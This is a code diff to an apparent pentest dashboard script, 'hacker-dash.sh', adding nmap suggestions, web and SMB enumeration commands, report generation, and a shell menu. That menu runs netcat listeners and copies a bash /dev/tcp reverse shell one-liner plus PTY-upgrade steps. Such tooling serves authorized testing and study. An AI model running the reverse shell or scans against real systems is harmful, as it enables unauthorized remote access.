@@ -27,14 +27,14 @@ if [ -z "${BASH_VERSION:-}" ]; then
   fi
 
   case "${1:-}" in
-    --print-env|--help|-h|--set|--clear)
+    --print-env|--help|-h|--set|--clear|--doctor|--report)
       bash "$_hd_self" "$@"
       _hd_rc=$?
       ;;
     *)
       if [ -n "${TMUX:-}" ] && [ -z "${HACKER_DASH_IN_POPUP:-}" ] && [ "${1:-}" != "--no-popup" ] && command -v tmux >/dev/null 2>&1; then
         _hd_q="$(printf '%q' "$_hd_self")"
-        tmux display-popup -E -w 56 -h 16 -T " hacker-dash " "HACKER_DASH_IN_POPUP=1 bash $_hd_q --no-popup"
+        tmux display-popup -E -w 64 -h 20 -T " hacker-dash " "HACKER_DASH_IN_POPUP=1 bash $_hd_q --no-popup"
         _hd_rc=$?
       else
         bash "$_hd_self" "$@"
@@ -62,6 +62,9 @@ RPORTS="${RPORTS:-}"
 HD_SELECTED=0
 HD_STATUS=""
 HD_EXIT_AFTER_COMMAND=0
+HD_LAST_REPORT_FILE=""
+HD_PREPARED_COMMAND=""
+HD_LPORT=""
 
 is_sourced() {
   [[ "${BASH_SOURCE[0]}" != "$0" ]]
@@ -260,9 +263,12 @@ draw_dashboard() {
   row 1 'HUNTER:' "$HUNTER"
   row 2 'URL:' "$URL"
   row 3 'RPORTS:' "$RPORTS"
+  printf ' %bServices:%b %s\n' "$dim" "$reset" "$(smart_service_summary)"
   printf '%b────────────────────────────────────────────%b\n' "$grey" "$reset"
   printf '  %b↑/↓ j/k%b select  %bc%b copy  %be%b edit  %br%b run  %bq%b quit\n' \
     "$dim" "$reset" "$bold" "$reset" "$bold" "$reset" "$bold" "$reset" "$bold" "$reset"
+  printf '  %bu%b url  %bx%b cheats  %bl%b shell  %bd%b doctor  %bp%b report\n' \
+    "$bold" "$reset" "$bold" "$reset" "$bold" "$reset" "$bold" "$reset" "$bold" "$reset"
 
   if [[ -n "$HD_STATUS" ]]; then
     printf '\n  %b%s%b\n' "$grey" "$HD_STATUS" "$reset"
@@ -311,6 +317,159 @@ menu_option() {
   else
     printf ' %b%s %s%b\n' "$dim" "$marker" "$text" "$reset"
   fi
+}
+
+wait_for_back() {
+  printf '\n  %bEnter%b back' "$bold" "$reset"
+  IFS= read -rsn1 _ || true
+}
+
+port_in_rports() {
+  local wanted="$1" port
+  local -a _hd_ports
+  IFS=',' read -r -a _hd_ports <<< "$RPORTS"
+  for port in "${_hd_ports[@]}"; do
+    port="${port//[[:space:]]/}"
+    [[ "$port" == "$wanted" ]] && return 0
+  done
+  return 1
+}
+
+has_any_port() {
+  local wanted
+  for wanted in "$@"; do
+    port_in_rports "$wanted" && return 0
+  done
+  return 1
+}
+
+has_ssh_ports() {
+  has_any_port 22
+}
+
+has_ftp_ports() {
+  has_any_port 21
+}
+
+has_web_ports() {
+  [[ -n "$URL" ]] && return 0
+  has_any_port 80 81 88 3000 5000 8000 8008 8080 8081 8888 9000
+}
+
+has_tls_web_ports() {
+  [[ "$URL" == https://* ]] && return 0
+  has_any_port 443 4443 8443 9443
+}
+
+has_smb_ports() {
+  has_any_port 139 445
+}
+
+first_matching_port() {
+  local wanted
+  for wanted in "$@"; do
+    if port_in_rports "$wanted"; then
+      printf '%s' "$wanted"
+      return 0
+    fi
+  done
+  return 1
+}
+
+smart_service_summary() {
+  local services=()
+  has_ftp_ports && services+=("FTP")
+  has_ssh_ports && services+=("SSH")
+  { has_web_ports || has_tls_web_ports; } && services+=("Web")
+  has_smb_ports && services+=("SMB")
+
+  if [[ "${#services[@]}" -eq 0 ]]; then
+    if [[ -n "$RPORTS" ]]; then
+      printf 'custom ports (%s)' "$RPORTS"
+    else
+      printf 'set RPORTS for smart suggestions'
+    fi
+    return 0
+  fi
+
+  local joined="" svc
+  for svc in "${services[@]}"; do
+    if [[ -z "$joined" ]]; then
+      joined="$svc"
+    else
+      joined+=", $svc"
+    fi
+  done
+  printf '%s' "$joined"
+}
+
+tool_line() {
+  local tool="$1" purpose="$2"
+  if command -v "$tool" >/dev/null 2>&1; then
+    printf '  [OK]      %-14s %s\n' "$tool" "$purpose"
+  else
+    printf '  [MISSING] %-14s %s\n' "$tool" "$purpose"
+  fi
+}
+
+doctor_report() {
+  printf 'Dependency doctor\n'
+  printf '=================\n\n'
+  printf 'Core tools\n'
+  tool_line bash 'script runtime'
+  tool_line tmux 'Ctrl-g popup and command windows'
+  tool_line curl 'HTTP probing'
+  tool_line nc 'connect/listen helper'
+  tool_line rlwrap 'comfortable reverse-shell listener wrapper'
+  tool_line base64 'OSC52 clipboard fallback'
+
+  printf '\nPentest tools\n'
+  tool_line nmap 'baseline scanning'
+  tool_line rustscan 'fast port discovery'
+  tool_line whatweb 'web fingerprinting'
+  tool_line nikto 'web checks'
+  tool_line gobuster 'directory brute force'
+  tool_line ffuf 'fuzzing'
+  tool_line feroxbuster 'recursive content discovery'
+  tool_line smbclient 'SMB share listing'
+  tool_line enum4linux-ng 'SMB enumeration'
+
+  printf '\nClipboard helpers\n'
+  tool_line wl-copy 'Wayland clipboard'
+  tool_line xclip 'X11 clipboard'
+  tool_line xsel 'X11 clipboard fallback'
+  tool_line pbcopy 'macOS clipboard'
+}
+
+doctor_screen() {
+  clear_screen
+  printf '%bDependency doctor%b\n' "$bold" "$reset"
+  printf '%bCore%b\n' "$grey" "$reset"
+  tool_line bash 'runtime'
+  tool_line tmux 'Ctrl-g popup'
+  tool_line curl 'HTTP'
+  tool_line nc 'listeners'
+  tool_line rlwrap 'listener wrapper'
+  printf '\n%bPentest%b\n' "$grey" "$reset"
+  tool_line nmap 'scan'
+  tool_line rustscan 'fast scan'
+  tool_line whatweb 'web'
+  tool_line gobuster 'dirs'
+  tool_line ffuf 'fuzz'
+  tool_line smbclient 'SMB'
+  printf '\n  %bc%b copy full doctor  %bEnter%b back' "$bold" "$reset" "$bold" "$reset"
+
+  local key
+  key="$(read_key)" || return
+  case "$key" in
+    c|C)
+      if copy_clipboard "$(doctor_report)"; then
+        HD_STATUS="Copied dependency doctor report"
+      else
+        HD_STATUS="Could not copy dependency doctor report"
+      fi
+      ;;
+  esac
 }
 
 valid_port() {
@@ -477,6 +636,52 @@ edit_selected() {
   HD_STATUS="Updated $name and exported vars"
 }
 
+prepare_command() {
+  local title="$1" cmd="$2" key edited
+  HD_PREPARED_COMMAND="$cmd"
+
+  if [[ ! -t 0 ]]; then
+    HD_PREPARED_COMMAND="$cmd"
+    printf '%s' "$cmd"
+    return 0
+  fi
+
+  while true; do
+    clear_screen
+    printf '%b%s%b\n\n' "$bold" "$title" "$reset"
+    printf '%bPreview command%b\n' "$grey" "$reset"
+    printf '%s\n\n' "$cmd"
+    printf '  %bEnter%b run  %be%b edit  %bc%b copy  %bb%b back' \
+      "$bold" "$reset" "$bold" "$reset" "$bold" "$reset" "$bold" "$reset"
+
+    key="$(read_key)" || return 1
+    case "$key" in
+      ''|$'\r'|$'\n')
+        HD_PREPARED_COMMAND="$cmd"
+        return 0
+        ;;
+      e|E)
+        clear_screen
+        printf '%bEdit command%b\n\n' "$bold" "$reset"
+        printf 'Current:\n%s\n\n' "$cmd"
+        printf 'New command: '
+        IFS= read -r edited
+        [[ -n "$edited" ]] && cmd="$edited"
+        ;;
+      c|C)
+        if copy_clipboard "$cmd"; then
+          HD_STATUS="Copied command preview"
+        else
+          HD_STATUS="Clipboard copy failed"
+        fi
+        ;;
+      b|B|q|Q|$'\x1b')
+        return 1
+        ;;
+    esac
+  done
+}
+
 write_command_script() {
   local cmd="$1" script cwd
   cwd="$PWD"
@@ -501,6 +706,12 @@ write_command_script() {
 
 launch_terminal_command() {
   local title="$1" cmd="$2" script
+  prepare_command "$title" "$cmd" || {
+    HD_STATUS="Command cancelled"
+    return 1
+  }
+  cmd="$HD_PREPARED_COMMAND"
+
   export_vars
   save_state
 
@@ -619,6 +830,16 @@ run_nmap_smb() {
   launch_terminal_command "hd-smb-nmap" "mkdir -p scans; nmap --script smb-enum-shares,smb-enum-users -p445 -oA scans/smb $(quote_shell "$TARGET")"
 }
 
+run_nmap_ssh() {
+  require_target || return
+  launch_terminal_command "hd-ssh-nmap" "mkdir -p scans; nmap -sV -p22 --script ssh-hostkey,ssh2-enum-algos -oA scans/ssh $(quote_shell "$TARGET")"
+}
+
+run_nmap_ftp() {
+  require_target || return
+  launch_terminal_command "hd-ftp-nmap" "mkdir -p scans; nmap -sV -p21 --script ftp-anon,ftp-syst,ftp-bounce -oA scans/ftp $(quote_shell "$TARGET")"
+}
+
 run_ping() {
   require_target || return
   launch_terminal_command "hd-ping" "ping -c 4 $(quote_shell "$TARGET")"
@@ -637,6 +858,143 @@ run_nc_connect() {
   local port
   port="$(first_rport)"
   launch_terminal_command "hd-nc" "nc -nv $(quote_shell "$TARGET") $(quote_shell "$port")"
+}
+
+prompt_lport() {
+  local default_port="${1:-4444}" port
+  HD_LPORT=""
+  clear_screen
+  printf '%bListener port%b\n\n' "$bold" "$reset"
+  printf 'Default: %s\n' "$default_port"
+  printf 'LPORT: '
+  IFS= read -r port
+  port="${port//[[:space:]]/}"
+  [[ -z "$port" ]] && port="$default_port"
+  if ! valid_port "$port"; then
+    HD_STATUS="Invalid listener port: $port"
+    return 1
+  fi
+  HD_LPORT="$port"
+}
+
+run_nc_listener() {
+  local port
+  prompt_lport 4444 || return
+  port="$HD_LPORT"
+  launch_terminal_command "hd-listener" "nc -lvnp $(quote_shell "$port")"
+}
+
+run_rlwrap_listener() {
+  local port
+  prompt_lport 4444 || return
+  port="$HD_LPORT"
+  launch_terminal_command "hd-rlwrap-listener" "rlwrap -cAr nc -lvnp $(quote_shell "$port")"
+}
+
+copy_text_status() {
+  local label="$1" text="$2"
+  if copy_clipboard "$text"; then
+    HD_STATUS="Copied $label"
+  else
+    HD_STATUS="Could not copy $label"
+  fi
+}
+
+bash_reverse_shell() {
+  local port
+  [[ -n "$HUNTER" ]] || { HD_STATUS="Set HUNTER/LHOST first"; return 1; }
+  prompt_lport 4444 || return
+  port="$HD_LPORT"
+  copy_text_status "bash reverse shell" "bash -c 'bash -i >& /dev/tcp/$HUNTER/$port 0>&1'"
+}
+
+copy_pty_upgrade() {
+  copy_text_status "PTY upgrade" "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'; export TERM=xterm; stty rows 40 cols 120"
+}
+
+copy_stabilize_steps() {
+  copy_text_status "shell stabilize steps" $'python3 -c '\''import pty; pty.spawn("/bin/bash")'\''\nCtrl-Z\nstty raw -echo; fg\nreset\nexport TERM=xterm\nstty rows 40 cols 120'
+}
+
+cheat_export_vars() {
+  printf 'export TARGET=%s HUNTER=%s URL=%s RPORTS=%s' \
+    "$(quote_shell "$TARGET")" "$(quote_shell "$HUNTER")" "$(quote_shell "$URL")" "$(quote_shell "$RPORTS")"
+}
+
+cheat_nmap_quick() {
+  printf 'mkdir -p scans; nmap -sC -sV -oA scans/tcp %s' "$(quote_shell "$TARGET")"
+}
+
+cheat_nmap_rports() {
+  printf 'mkdir -p scans; nmap -sC -sV -p %s -oA scans/rports %s' "$(quote_shell "$RPORTS")" "$(quote_shell "$TARGET")"
+}
+
+cheat_gobuster() {
+  local url
+  url="$(active_url)"
+  printf 'mkdir -p scans; wordlist=${WORDLIST:-/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt}; gobuster dir -u %s -w "$wordlist" -o scans/gobuster.txt' "$(quote_shell "$url")"
+}
+
+cheat_ffuf() {
+  local url
+  url="$(active_url)"
+  printf 'mkdir -p scans; wordlist=${WORDLIST:-/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt}; ffuf -u %s -w "$wordlist" -o scans/ffuf.json' "$(quote_shell "$url/FUZZ")"
+}
+
+generate_report() {
+  load_state
+  local services url scan_dir generated
+  services="$(smart_service_summary)"
+  url="$(active_url)"
+  scan_dir="$PWD/scans"
+  generated="$(date '+%Y-%m-%d %H:%M:%S %Z' 2>/dev/null || printf 'unknown')"
+
+  printf '# Professional Pentest Brief\n\n'
+  printf -- '- Generated: %s\n' "$generated"
+  printf -- '- Target: %s\n' "${TARGET:-not set}"
+  printf -- '- Hunter/LHOST: %s\n' "${HUNTER:-not set}"
+  printf -- '- Primary URL: %s\n' "${url:-not set}"
+  printf -- '- Reported ports: %s\n' "${RPORTS:-not set}"
+  printf -- '- Detected services: %s\n' "$services"
+  printf -- '- Scan directory: %s\n\n' "$scan_dir"
+
+  printf '## Recommended next steps\n'
+  printf '1. Baseline: run nmap quick scripts/services and save output under scans/.\n'
+  [[ -n "$RPORTS" ]] && printf '2. Validate discovered ports: run nmap selected RPORTS against %s.\n' "$RPORTS"
+  if has_web_ports || has_tls_web_ports; then
+    printf '3. Web: run whatweb, curl headers, and one directory brute-force tool against %s.\n' "${url:-the selected URL}"
+  fi
+  if has_smb_ports; then
+    printf '4. SMB: list shares anonymously, run enum4linux-ng, and run nmap SMB scripts.\n'
+  fi
+  if has_ssh_ports; then
+    printf '5. SSH: capture host keys/algorithms and keep credentials testing manual and authorized.\n'
+  fi
+  if has_ftp_ports; then
+    printf '6. FTP: check anonymous login and run safe FTP nmap scripts.\n'
+  fi
+  printf '\n## Copy-ready commands\n'
+  [[ -n "$TARGET" ]] && printf -- '- %s\n' "$(cheat_nmap_quick)"
+  [[ -n "$TARGET" && -n "$RPORTS" ]] && printf -- '- %s\n' "$(cheat_nmap_rports)"
+  if [[ -n "$url" ]]; then
+    printf -- '- curl -iL %s\n' "$(quote_shell "$url")"
+    printf -- '- %s\n' "$(cheat_gobuster)"
+  fi
+  printf '\n## Operator notes\n'
+  printf -- '- Keep authorization/scope attached to this report before sharing.\n'
+  printf -- '- Treat automated output as leads; manually verify findings before reporting.\n'
+}
+
+save_report_file() {
+  local safe_target stamp path
+  safe_target="${TARGET:-target}"
+  safe_target="${safe_target//[^A-Za-z0-9._-]/_}"
+  stamp="$(date '+%Y%m%d-%H%M%S')"
+  mkdir -p reports
+  path="reports/${safe_target}-brief-${stamp}.md"
+  generate_report > "$path"
+  HD_LAST_REPORT_FILE="$PWD/$path"
+  printf '%s' "$HD_LAST_REPORT_FILE"
 }
 
 menu_header() {
@@ -771,15 +1129,227 @@ utils_menu() {
   done
 }
 
-command_menu() {
-  local key selected=0 max=4
+smart_menu() {
+  local key selected=0 max i action
+  local labels=() actions=()
+  labels+=("nmap quick scripts/services") actions+=("run_nmap_quick")
+  [[ -n "$RPORTS" ]] && { labels+=("nmap selected RPORTS ($RPORTS)"); actions+=("run_nmap_rports"); }
+  labels+=("nmap all TCP ports") actions+=("run_nmap_allports")
+  if has_web_ports || has_tls_web_ports; then
+    labels+=("WEB suggested: whatweb URL") actions+=("run_whatweb")
+    labels+=("WEB suggested: gobuster dir") actions+=("run_gobuster_dir")
+  fi
+  has_smb_ports && { labels+=("SMB suggested: list shares"); actions+=("run_smbclient"); labels+=("SMB suggested: enum4linux-ng"); actions+=("run_enum4linux"); }
+  has_ssh_ports && { labels+=("SSH suggested: nmap SSH scripts"); actions+=("run_nmap_ssh"); }
+  has_ftp_ports && { labels+=("FTP suggested: nmap FTP scripts"); actions+=("run_nmap_ftp"); }
+  labels+=("Back") actions+=("back")
+  max=$((${#labels[@]} - 1))
+
   while true; do
+    menu_header "Smart suggestions"
+    printf '  Services: %s\n\n' "$(smart_service_summary)"
+    for i in "${!labels[@]}"; do
+      menu_option "$i" "$selected" "${labels[$i]}"
+    done
+    printf '\n  %bNmap stays always available. Enter%b run\n' "$dim" "$reset"
+
+    key="$(read_key)" || return
+    case "$key" in
+      $'\x1b[A'|k|K) (( selected > 0 )) && ((selected--)) ;;
+      $'\x1b[B'|j|J) (( selected < max )) && ((selected++)) ;;
+      [1-9])
+        i=$((key - 1))
+        if (( i >= 0 && i <= max )); then
+          action="${actions[$i]}"
+          [[ "$action" == "back" ]] && return
+          "$action"; return
+        fi
+        ;;
+      b|B|q|Q) return ;;
+      ''|$'\r'|$'\n')
+        action="${actions[$selected]}"
+        [[ "$action" == "back" ]] && return
+        "$action"; return
+        ;;
+    esac
+  done
+}
+
+url_helper_menu() {
+  local key selected=0 max=5 web_port tls_port custom
+  web_port="$(first_matching_port 80 8080 8000 8008 8081 8888 3000 5000 9000 2>/dev/null)"
+  tls_port="$(first_matching_port 443 8443 4443 9443 2>/dev/null)"
+
+  while true; do
+    menu_header "URL helper"
+    printf '  TARGET: %s\n  Current URL: %s\n\n' "${TARGET:-<empty>}" "${URL:-<empty>}"
+    menu_option 0 "$selected" "Set http://TARGET"
+    menu_option 1 "$selected" "Set https://TARGET"
+    menu_option 2 "$selected" "Set http://TARGET:${web_port:-8080}"
+    menu_option 3 "$selected" "Set https://TARGET:${tls_port:-8443}"
+    menu_option 4 "$selected" "Custom URL"
+    menu_option 5 "$selected" "Back"
+    printf '\n  %b↑/↓ j/k%b select  %bEnter%b choose\n' "$dim" "$reset" "$bold" "$reset"
+
+    key="$(read_key)" || return
+    case "$key" in
+      $'\x1b[A'|k|K) (( selected > 0 )) && ((selected--)) ;;
+      $'\x1b[B'|j|J) (( selected < max )) && ((selected++)) ;;
+      [1-6]) selected=$((key - 1)); key=$'\r' ;;
+      b|B|q|Q) return ;;
+    esac
+    case "$key" in
+      ''|$'\r'|$'\n')
+        if [[ "$selected" -ne 4 && "$selected" -ne 5 && -z "$TARGET" ]]; then
+          HD_STATUS="Set TARGET first"
+          return 1
+        fi
+        case "$selected" in
+          0) URL="http://$TARGET" ;;
+          1) URL="https://$TARGET" ;;
+          2) URL="http://$TARGET:${web_port:-8080}" ;;
+          3) URL="https://$TARGET:${tls_port:-8443}" ;;
+          4)
+            clear_screen
+            printf '%bCustom URL%b\n\n' "$bold" "$reset"
+            printf 'Example: http://%s:8080\n' "${TARGET:-target}"
+            printf 'URL: '
+            IFS= read -r custom
+            [[ -z "$custom" ]] && { HD_STATUS="URL unchanged"; return; }
+            URL="$custom"
+            ;;
+          5) return ;;
+        esac
+        save_state; export_vars; notify_parent_shell
+        HD_STATUS="Updated URL to $URL"
+        return
+        ;;
+    esac
+  done
+}
+
+cheats_menu() {
+  local key selected=0 max=6
+  while true; do
+    menu_header "Copy cheats"
+    menu_option 0 "$selected" "export TARGET/HUNTER/URL/RPORTS"
+    menu_option 1 "$selected" "nmap quick command"
+    menu_option 2 "$selected" "nmap selected RPORTS command"
+    menu_option 3 "$selected" "gobuster command"
+    menu_option 4 "$selected" "ffuf command"
+    menu_option 5 "$selected" "professional report"
+    menu_option 6 "$selected" "Back"
+    printf '\n  %bEnter%b copy  %bb%b back\n' "$bold" "$reset" "$bold" "$reset"
+
+    key="$(read_key)" || return
+    case "$key" in
+      $'\x1b[A'|k|K) (( selected > 0 )) && ((selected--)) ;;
+      $'\x1b[B'|j|J) (( selected < max )) && ((selected++)) ;;
+      [1-7]) selected=$((key - 1)); key=$'\r' ;;
+      b|B|q|Q) return ;;
+    esac
+    case "$key" in
+      ''|$'\r'|$'\n')
+        case "$selected" in
+          0) copy_text_status "export line" "$(cheat_export_vars)" ;;
+          1) require_target && copy_text_status "nmap quick command" "$(cheat_nmap_quick)" ;;
+          2) require_target && require_rports && copy_text_status "nmap RPORTS command" "$(cheat_nmap_rports)" ;;
+          3) require_url && copy_text_status "gobuster command" "$(cheat_gobuster)" ;;
+          4) require_url && copy_text_status "ffuf command" "$(cheat_ffuf)" ;;
+          5) copy_text_status "professional report" "$(generate_report)" ;;
+          6) return ;;
+        esac
+        return
+        ;;
+    esac
+  done
+}
+
+shells_menu() {
+  local key selected=0 max=5
+  while true; do
+    menu_header "Shell helper"
+    printf '  HUNTER/LHOST: %s\n\n' "${HUNTER:-<empty>}"
+    menu_option 0 "$selected" "nc listener"
+    menu_option 1 "$selected" "rlwrap nc listener"
+    menu_option 2 "$selected" "copy bash reverse shell"
+    menu_option 3 "$selected" "copy Python PTY upgrade"
+    menu_option 4 "$selected" "copy stabilize steps"
+    menu_option 5 "$selected" "Back"
+    printf '\n  %bEnter%b choose  %bb%b back\n' "$bold" "$reset" "$bold" "$reset"
+
+    key="$(read_key)" || return
+    case "$key" in
+      $'\x1b[A'|k|K) (( selected > 0 )) && ((selected--)) ;;
+      $'\x1b[B'|j|J) (( selected < max )) && ((selected++)) ;;
+      [1-6]) selected=$((key - 1)); key=$'\r' ;;
+      b|B|q|Q) return ;;
+    esac
+    case "$key" in
+      ''|$'\r'|$'\n')
+        case "$selected" in
+          0) run_nc_listener; return ;;
+          1) run_rlwrap_listener; return ;;
+          2) bash_reverse_shell; return ;;
+          3) copy_pty_upgrade; return ;;
+          4) copy_stabilize_steps; return ;;
+          5) return ;;
+        esac
+        ;;
+    esac
+  done
+}
+
+report_menu() {
+  local key selected=0 max=3 report_path
+  while true; do
+    menu_header "Professional report"
+    printf '  Target: %s\n' "${TARGET:-<empty>}"
+    printf '  Services: %s\n\n' "$(smart_service_summary)"
+    menu_option 0 "$selected" "Copy report"
+    menu_option 1 "$selected" "Save report to ./reports"
+    menu_option 2 "$selected" "Preview compact brief"
+    menu_option 3 "$selected" "Back"
+    printf '\n  %bEnter%b choose  %bb%b back\n' "$bold" "$reset" "$bold" "$reset"
+
+    key="$(read_key)" || return
+    case "$key" in
+      $'\x1b[A'|k|K) (( selected > 0 )) && ((selected--)) ;;
+      $'\x1b[B'|j|J) (( selected < max )) && ((selected++)) ;;
+      [1-4]) selected=$((key - 1)); key=$'\r' ;;
+      b|B|q|Q) return ;;
+    esac
+    case "$key" in
+      ''|$'\r'|$'\n')
+        case "$selected" in
+          0) copy_text_status "professional report" "$(generate_report)"; return ;;
+          1) report_path="$(save_report_file)"; HD_STATUS="Saved report: $report_path"; return ;;
+          2)
+            clear_screen
+            printf '%bProfessional Pentest Brief%b\n\n' "$bold" "$reset"
+            printf 'Target: %s\nHunter: %s\nURL: %s\nPorts: %s\nServices: %s\n' \
+              "${TARGET:-not set}" "${HUNTER:-not set}" "${URL:-not set}" "${RPORTS:-not set}" "$(smart_service_summary)"
+            wait_for_back
+            ;;
+          3) return ;;
+        esac
+        ;;
+    esac
+  done
+}
+
+command_menu() {
+  local key selected=0 max=6 smart_label
+  while true; do
+    smart_label="Smart    $(smart_service_summary)"
     menu_header "Run commands"
-    menu_option 0 "$selected" "Recon    nmap, rustscan"
-    menu_option 1 "$selected" "Web      whatweb, nikto, gobuster, ffuf, ferox"
-    menu_option 2 "$selected" "SMB      smbclient, enum4linux-ng, nmap smb"
-    menu_option 3 "$selected" "Utility  ping, curl, nc"
-    menu_option 4 "$selected" "Back"
+    menu_option 0 "$selected" "$smart_label"
+    menu_option 1 "$selected" "Recon   nmap always, rustscan"
+    menu_option 2 "$selected" "Web     whatweb, nikto, gobuster, ffuf"
+    menu_option 3 "$selected" "SMB     smbclient, enum4linux-ng, nmap"
+    menu_option 4 "$selected" "Utility ping, curl, nc"
+    menu_option 5 "$selected" "Shells  listeners and reverse-shell copy"
+    menu_option 6 "$selected" "Back"
     printf '\n  %b↑/↓ j/k%b select  %bEnter%b choose\n' "$dim" "$reset" "$bold" "$reset"
     if [[ -n "$HD_STATUS" ]]; then
       printf '\n  %b%s%b\n' "$grey" "$HD_STATUS" "$reset"
@@ -789,18 +1359,22 @@ command_menu() {
     case "$key" in
       $'\x1b[A'|k|K) (( selected > 0 )) && ((selected--)) ;;
       $'\x1b[B'|j|J) (( selected < max )) && ((selected++)) ;;
-      1) recon_menu ;;
-      2) web_menu ;;
-      3) smb_menu ;;
-      4) utils_menu ;;
-      5|b|B|q|Q) return ;;
+      1) smart_menu ;;
+      2) recon_menu ;;
+      3) web_menu ;;
+      4) smb_menu ;;
+      5) utils_menu ;;
+      6) shells_menu ;;
+      7|b|B|q|Q) return ;;
       ''|$'\r'|$'\n')
         case "$selected" in
-          0) recon_menu ;;
-          1) web_menu ;;
-          2) smb_menu ;;
-          3) utils_menu ;;
-          4) return ;;
+          0) smart_menu ;;
+          1) recon_menu ;;
+          2) web_menu ;;
+          3) smb_menu ;;
+          4) utils_menu ;;
+          5) shells_menu ;;
+          6) return ;;
         esac
         ;;
     esac
@@ -828,20 +1402,29 @@ Usage:
   ./hacker-dash.sh --print-env        # print export commands
   ./hacker-dash.sh --set VAR VALUE    # set TARGET/HUNTER/URL/RPORTS
   ./hacker-dash.sh --clear            # clear all values
+  ./hacker-dash.sh --doctor           # check useful local dependencies
+  ./hacker-dash.sh --report           # print a smart pentest brief
 
 Main keys:
   ↑/↓ or j/k  select TARGET/HUNTER/URL/RPORTS
   c           copy selected value and export vars
   e           edit selected value; RPORTS opens add/delete/replace menu
   r           run command menu; choose with ↑/↓ or j/k, Enter to run
+  u           URL helper from TARGET and web ports
+  x           copy cheat commands/report
+  l           listener and shell helper
+  d           dependency doctor
+  p           professional report menu
   q           quit
 
 Command menu:
   Use ↑/↓ or j/k, then Enter. Number keys still work.
+  Smart       service-aware suggestions from RPORTS; nmap stays always visible
   Recon       nmap quick, nmap RPORTS, nmap all ports, rustscan
   Web         whatweb, nikto, gobuster, ffuf, feroxbuster
   SMB         smbclient, enum4linux-ng, nmap SMB scripts
   Utility     ping, curl, nc
+  Shells      listeners and reverse-shell/PTY copy helpers
 
 Notes:
   RPORTS is a comma-separated list, e.g. 22,80,443,8080.
@@ -867,6 +1450,11 @@ run_ui() {
       c|C) copy_selected ;;
       e|E) edit_selected ;;
       r|R) command_menu; [[ "$HD_EXIT_AFTER_COMMAND" -eq 1 ]] && return 0 ;;
+      u|U) url_helper_menu ;;
+      x|X) cheats_menu ;;
+      l|L) shells_menu; [[ "$HD_EXIT_AFTER_COMMAND" -eq 1 ]] && return 0 ;;
+      d|D) doctor_screen ;;
+      p|P) report_menu ;;
       q|Q|$'\x03') clear_screen; return 0 ;;
     esac
   done
@@ -885,7 +1473,7 @@ run_popup() {
   qpath="$(quote_shell "$path")"
   cmd="HACKER_DASH_IN_POPUP=1 HACKER_DASH_NOTIFY_PID=$$ bash $qpath --no-popup"
 
-  tmux display-popup -E -w 56 -h 16 -T " hacker-dash " "$cmd"
+  tmux display-popup -E -w 64 -h 20 -T " hacker-dash " "$cmd"
   hd_status=$?
 
   refresh_env_from_state
@@ -900,6 +1488,14 @@ main() {
       ;;
     --print-env)
       print_env
+      return 0
+      ;;
+    --doctor)
+      doctor_report
+      return 0
+      ;;
+    --report)
+      generate_report
       return 0
       ;;
     --set)
